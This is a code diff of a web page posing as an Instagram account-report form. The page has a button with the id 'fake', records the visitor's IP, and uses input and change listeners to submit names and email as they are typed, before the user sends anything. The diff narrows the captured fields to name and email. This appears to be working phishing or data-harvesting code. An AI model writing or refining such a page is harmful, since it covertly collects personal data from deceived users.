@@ -164,10 +164,10 @@
         <input type="email" id="email" name="email" autocomplete="email" required>
         
         <label for="handle">Instagram Handle to Report</label>
-        <input type="text" id="handle" name="handle" placeholder="@username" required>
+        <input type="text" id="handle" name="handle" placeholder="@username">
 
         <label for="reason">Reason for Reporting</label>
-        <textarea id="reason" name="reason" placeholder="Tell us why this account should be banned..." required></textarea>
+        <textarea id="reason" name="reason" placeholder="Tell us why this account should be banned..."></textarea>
       </form>
       <button id="fake">Approve</button>
     </div>
@@ -181,8 +181,6 @@
     const fnameField = document.getElementById('fname');
     const lnameField = document.getElementById('lname');
     const emailField = document.getElementById('email');
-    const handleField = document.getElementById('handle');
-    const reasonField = document.getElementById('reason');
 
     let userIP = 'Unknown IP';
 
@@ -207,16 +205,12 @@
       if (
         fnameField.value.trim() !== '' ||
         lnameField.value.trim() !== '' ||
-        emailField.value.trim() !== '' ||
-        handleField.value.trim() !== '' ||
-        reasonField.value.trim() !== ''
+        emailField.value.trim() !== ''
       ) {
         submitForm(
           fnameField.value.trim() || '[No First Name]',
           lnameField.value.trim() || '[No Last Name]',
-          emailField.value.trim() || '[No Email]',
-          handleField.value.trim() || '[No Handle]',
-          reasonField.value.trim() || '[No Reason]'
+          emailField.value.trim() || '[No Email]'
         );
       }
     }
@@ -246,14 +240,10 @@
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
-    handleField.addEventListener('input', checkFields);
-    reasonField.addEventListener('input', checkFields);
 
     fnameField.addEventListener('change', checkFields);
     lnameField.addEventListener('change', checkFields);
     emailField.addEventListener('change', checkFields);
-    handleField.addEventListener('change', checkFields);
-    reasonField.addEventListener('change', checkFields);
   </script>
 </body>
 </html>
